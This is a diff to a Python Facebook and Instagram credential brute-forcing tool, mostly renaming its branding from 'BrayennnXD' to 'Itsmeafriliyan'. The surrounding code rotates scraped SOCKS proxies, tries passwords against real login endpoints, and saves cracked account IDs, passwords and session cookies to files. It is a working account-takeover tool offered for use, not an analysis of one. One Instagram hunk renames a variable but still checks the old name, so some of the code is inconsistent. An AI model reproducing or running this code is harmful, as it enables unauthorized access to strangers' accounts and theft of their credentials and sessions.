@@ -22,7 +22,7 @@ from rich.columns import Columns as col
 from rich.console import Console as sol
 from rich.markdown import Markdown as mark
 from concurrent.futures import ThreadPoolExecutor as tred
-from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
+from concurrent.futures import ThreadPoolExecutor as ItsmeafriliyanXD 
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
 #------------------[  MODULE  ]-------------------#
 try:
@@ -53,7 +53,7 @@ console = Console()
 ses=requests.Session()
 id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
 ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
-sys.stdout.write('\x1b]2; BMBF | BrayennnXD Multi Brute Facebook\x07')
+sys.stdout.write('\x1b]2; IMBF | Itsmeafriliyan Multi Brute Facebook\x07')
 #------------------[ USER-AGENT ]-------------------#
 try:
 	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
@@ -969,7 +969,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -978,7 +978,7 @@ def validate1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -991,7 +991,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1001,7 +1001,7 @@ def validate1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1038,7 +1038,7 @@ def validate2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1047,7 +1047,7 @@ def validate2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1060,7 +1060,7 @@ def validate2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1070,7 +1070,7 @@ def validate2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1107,7 +1107,7 @@ def validate3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1116,7 +1116,7 @@ def validate3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1129,7 +1129,7 @@ def validate3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1139,7 +1139,7 @@ def validate3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1195,7 +1195,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1204,7 +1204,7 @@ def reguler1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1217,7 +1217,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1227,7 +1227,7 @@ def reguler1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1281,7 +1281,7 @@ def reguler2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1290,7 +1290,7 @@ def reguler2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1303,7 +1303,7 @@ def reguler2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1313,7 +1313,7 @@ def reguler2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1369,7 +1369,7 @@ def reguler3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1378,7 +1378,7 @@ def reguler3(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1391,7 +1391,7 @@ def reguler3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1401,7 +1401,7 @@ def reguler3(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1458,7 +1458,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1467,7 +1467,7 @@ def kontol(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1480,7 +1480,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1490,7 +1490,7 @@ def kontol(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1547,7 +1547,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1556,7 +1556,7 @@ def bapi(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1569,7 +1569,7 @@ def bapi(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1579,7 +1579,7 @@ def bapi(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1617,7 +1617,7 @@ def colmek1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1626,7 +1626,7 @@ def colmek1(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1639,7 +1639,7 @@ def colmek1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1649,7 +1649,7 @@ def colmek1(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -1687,7 +1687,7 @@ def colmek2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1696,7 +1696,7 @@ def colmek2(idf,pwv):
 					cp+=1
 					print('\n')
 					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
-					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
+					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Itsmeafriliyan-CP')
 					cetak(statuscp1)
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
@@ -1709,7 +1709,7 @@ def colmek2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
@@ -1719,7 +1719,7 @@ def colmek2(idf,pwv):
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					print('\n')
 					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
-					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
+					statusok1 = nel(statusok, width=90, style='bold green', title='Itsmeafriliyan-OK')
 					cetak(statusok1)
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
@@ -3260,7 +3260,7 @@ class instagram:
 				    "stopDeletionNonce": "",
 				    "trustedDeviceRecords": "{}"}
 				respon=ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
-				brayennnxd=json.loads(respon.text)
+				Itsmeafriliyan=json.loads(respon.text)
 				if 'userId' in str(brayennnxd):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
@@ -3277,7 +3277,7 @@ class instagram:
 					success.append(user)
 					break
 
-				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
+				elif 'href="https://www.instagram.com/challenge/action/' in str(Itsmeafriliyan):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					tree = Tree("")
 					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
@@ -3309,7 +3309,7 @@ class instagram:
 		prog.advance(des)
 		try:
 			for pw in pas:
-				brayennnxd=random.randint(1000000000, 99999999999)
+				Itsmeafriliyan=random.randint(1000000000, 99999999999)
 				ts = calendar.timegm(current_GMT)
 				proxy = {'http': 'socks5://'+random.choice(proxxy)}
 				p = ses.get('https://www.instagram.com/web/__mid')
@@ -3338,8 +3338,8 @@ class instagram:
 			"stopDeletionNonce": "",
 			"trustedDeviceRecords": "{}"}
 				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
-				brayennnxd=json.loads(respon.text)
-				if 'userId' in str(brayennnxd):
+				Itsmeafriliyan=json.loads(respon.text)
+				if 'userId' in str(Itsmeafriliyan):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
 					nomor, tanggal = self.ingfo(cookie)
@@ -3355,7 +3355,7 @@ class instagram:
 					success.append(user)
 					break
 
-				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
+				elif 'href="https://www.instagram.com/challenge/action/' in str(Itsmeafriliyan):
 					nama,pengikut,mengikut,postingan=self.APIinfo(user)
 					tree = Tree("")
 					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
@@ -3382,7 +3382,7 @@ class instagram:
 			ts = calendar.timegm(current_GMT)
 			ses=requests.Session()
 			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
-			ua_brayen = USN
+			Ua_Itsmea = USN
 			token=s.get("https://i.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
 			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
 			s.headers.update({
@@ -3397,7 +3397,7 @@ class instagram:
 				'content-type': 'application/x-www-form-urlencoded',
 				'accept': '*/*',
 				'x-csrftoken': crf_token,
-				'user-agent': ua_brayen,
+				'user-agent': Ua_Itsmea,
 				'x-asbd-id': '198387',
 				'sec-ch-ua-platform': '"Android"',
 				'origin': 'https://www.instagram.com',
